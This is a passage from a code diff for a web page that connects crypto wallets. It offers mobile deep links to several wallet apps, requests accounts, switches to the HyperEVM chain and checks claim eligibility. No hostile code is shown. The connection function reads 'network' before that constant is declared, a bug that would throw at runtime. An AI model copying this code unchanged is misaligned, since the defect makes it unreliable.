+                    alert('Failed to connect wallet: ' + error.message);
+                }
+            } finally {
+                // Always reset button if still connecting
+                setTimeout(() => {
+                    const connectBtn = document.querySelector('.connect-btn');
+                    if (connectBtn && connectBtn.textContent === 'Connecting...') {
+                        connectBtn.textContent = 'Connect Wallet';
+                        connectBtn.disabled = false;
+                        console.log('Reset stuck connecting button');
+                    }
+                }, 5000);
+            }
+        }
+
+        // Show mobile wallet options
+        function showMobileWalletOptions() {
+            const modal = document.createElement('div');
+            modal.style.cssText = `
+                position: fixed;
+                top: 0;
+                left: 0;
+                width: 100%;
+                height: 100%;
+                background: rgba(0,0,0,0.8);
+                display: flex;
+                align-items: center;
+                justify-content: center;
+                z-index: 10000;
+                font-family: 'Inter', sans-serif;
+            `;
+            
+            modal.innerHTML = `
+                <div style="
+                    background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
+                    border: 1px solid rgba(255,255,255,0.1);
+                    border-radius: 24px;
+                    padding: 2rem;
+                    width: 350px;
+                    max-width: 90vw;
+                    text-align: center;
+                    color: white;
+                    position: relative;
+                ">
+                    <button onclick="this.parentElement.parentElement.remove()" style="
+                        position: absolute;
+                        top: 1rem;
+                        right: 1rem;
+                        background: none;
+                        border: none;
+                        color: #a0a0b8;
+                        font-size: 1.5rem;
+                        cursor: pointer;
+                    ">×</button>
+                    
+                    <h2 style="margin-bottom: 1.5rem; color: #6366f1;">Choose Your Wallet</h2>
+                    
+                    <div style="display: grid; gap: 0.75rem;">
+                        <button onclick="openMobileWallet('metamask')" style="
+                            width: 100%;
+                            background: linear-gradient(135deg, #f6851b 0%, #e2761b 100%);
+                            color: white;
+                            border: none;
+                            padding: 1rem;
+                            font-size: 1rem;
+                            font-weight: 600;
+                            border-radius: 12px;
+                            cursor: pointer;
+                        ">🦊 MetaMask</button>
+                        
+                        <button onclick="openMobileWallet('okx')" style="
+                            width: 100%;
+                            background: linear-gradient(135deg, #000000 0%, #333333 100%);
+                            color: white;
+                            border: none;
+                            padding: 1rem;
+                            font-size: 1rem;
+                            font-weight: 600;
+                            border-radius: 12px;
+                            cursor: pointer;
+                        ">⚫ OKX Wallet</button>
+                        
+                        <button onclick="openMobileWallet('bitget')" style="
+                            width: 100%;
+                            background: linear-gradient(135deg, #00D4AA 0%, #00B894 100%);
+                            color: white;
+                            border: none;
+                            padding: 1rem;
+                            font-size: 1rem;
+                            font-weight: 600;
+                            border-radius: 12px;
+                            cursor: pointer;
+                        ">💎 Bitget Wallet</button>
+                        
+                        <button onclick="openMobileWallet('rabby')" style="
+                            width: 100%;
+                            background: linear-gradient(135deg, #7c3aed 0%, #5b21b6 100%);
+                            color: white;
+                            border: none;
+                            padding: 1rem;
+                            font-size: 1rem;
+                            font-weight: 600;
+                            border-radius: 12px;
+                            cursor: pointer;
+                        ">🐰 Rabby Wallet</button>
+                        
+                        <button onclick="openMobileWallet('binance')" style="
+                            width: 100%;
+                            background: linear-gradient(135deg, #f0b90b 0%, #e5a808 100%);
+                            color: white;
+                            border: none;
+                            padding: 1rem;
+                            font-size: 1rem;
+                            font-weight: 600;
+                            border-radius: 12px;
+                            cursor: pointer;
+                        ">🟡 Binance Web3</button>
+                    </div>
+                </div>
+            `;
+            
+            document.body.appendChild(modal);
+        }
+
+        // Open mobile wallet apps with working deep links
+        function openMobileWallet(walletType) {
+            // Track wallet selection
+            if (window.trackEvent) {
+                window.trackEvent('Wallet Selected', { wallet: walletType });
+            }
+
+            // Close the modal first
+            const modal = document.querySelector('div[style*="position: fixed"]');
+            if (modal) modal.remove();
+
+            // Check if we're already in a wallet browser
+            if (detectWalletBrowser()) {
+                handleDirectWalletConnection();
+                return;
+            }
+
+            const currentUrl = window.location.href;
+            
+            switch (walletType) {
+                case 'metamask':
+                    // MetaMask universal link
+                    window.open(`https://metamask.app.link/dapp/${window.location.host}${window.location.pathname}`, '_self');
+                    break;
+                    
+                case 'okx':
+                    // OKX Web3 wallet browser opening
+                    window.open(`https://www.okx.com/web3/dapp/${window.location.host}${window.location.pathname}`, '_self');
+                    break;
+                    
+                case 'bitget':
+                    // Bitget wallet dapp browser
+                    window.open(`https://web3.bitget.com/dapp?url=${encodeURIComponent(currentUrl)}`, '_self');
+                    break;
+                    
+                case 'rabby':
+                    // Rabby doesn't have universal links, show instruction
+                    alert('Please open Rabby Wallet app manually and navigate to Browser tab, then enter this URL: ' + currentUrl);
+                    break;
+                    
+                case 'binance':
+                    // Binance Web3 wallet browser
+                    window.open(`https://app.binance.com/en/web3wallet/dapp?url=${encodeURIComponent(currentUrl)}`, '_self');
+                    break;
+            }
+        }
+
+        // Detect if we're running in a wallet browser
+        function detectWalletBrowser() {
+            const userAgent = navigator.userAgent.toLowerCase();
+            return (
+                window.ethereum ||
+                userAgent.includes('metamask') ||
+                userAgent.includes('okx') ||
+                userAgent.includes('bitkeep') ||
+                userAgent.includes('rabby') ||
+                userAgent.includes('binance') ||
+                window.okxwallet ||
+                window.bitkeep ||
+                window.rabby
+            );
+        }
+
+        // Handle direct wallet connection when in wallet browser
+        async function handleDirectWalletConnection() {
+            try {
+                if (window.ethereum) {
+                    // Create ethers provider and signer
+                    provider = new ethers.providers.Web3Provider(window.ethereum);
+                    
+                    const accounts = await provider.send('eth_requestAccounts', []);
+                    
+                    if (accounts.length > 0) {
+                        signer = provider.getSigner();
+                        const address = await signer.getAddress();
+                        
+                        isAuthenticated = true;
+                        user = {
+                            wallet: { address: address },
+                            id: address
+                        };
+                        
+                        console.log('Connected to wallet:', address);
+                        
+                        // Track successful wallet connection
+                        if (window.trackEvent) {
+                            window.trackEvent('Wallet Connected', { 
+                                address: address.substring(0, 6) + '...' + address.substring(address.length - 4),
+                                chainId: network?.chainId || 'unknown'
+                            });
+                        }
+                        
+                        // Check network (switch to HyperEVM if needed)
+                        const network = await provider.getNetwork();
+                        if (network.chainId !== 999) {
+                            try {
+                                await window.ethereum.request({
+                                    method: 'wallet_switchEthereumChain',
+                                    params: [{ chainId: HYPEREVM_CONFIG.chainId }],
+                                });
+                            } catch (switchError) {
+                                // If network doesn't exist, add it
+                                if (switchError.code === 4902) {
+                                    try {
+                                        await window.ethereum.request({
+                                            method: 'wallet_addEthereumChain',
+                                            params: [HYPEREVM_CONFIG],
+                                        });
+                                    } catch (addError) {
+                                        console.error('Failed to add HyperEVM network:', addError);
+                                        alert('Please add HyperEVM network to your wallet manually');
+                                    }
+                                } else {
+                                    console.error('Failed to switch network:', switchError);
+                                }
+                            }
+                        }
+                        
+                        checkEligibility();
+                        updateUI();
+                        return;
+                    }
+                }
+                
+                alert('Please try connecting through your wallet app directly');
+            } catch (error) {
+                console.error('Direct connection failed:', error);
+                alert('Connection failed: ' + error.message);
+            }
+        }
+
+
+
+        // Handle logout
+        async function handleLogout() {
+            try {
+                isAuthenticated = false;
+                user = null;
+                isEligible = null;
+                hasClaimed = false;
+                console.log('Disconnected from wallet');
+                updateUI();
+            } catch (error) {
+                console.error('Logout failed:', error);
+            }
+        }
+
+        // Initialize app - removed duplicate initialization
+    </script>
+</body>
+</html>
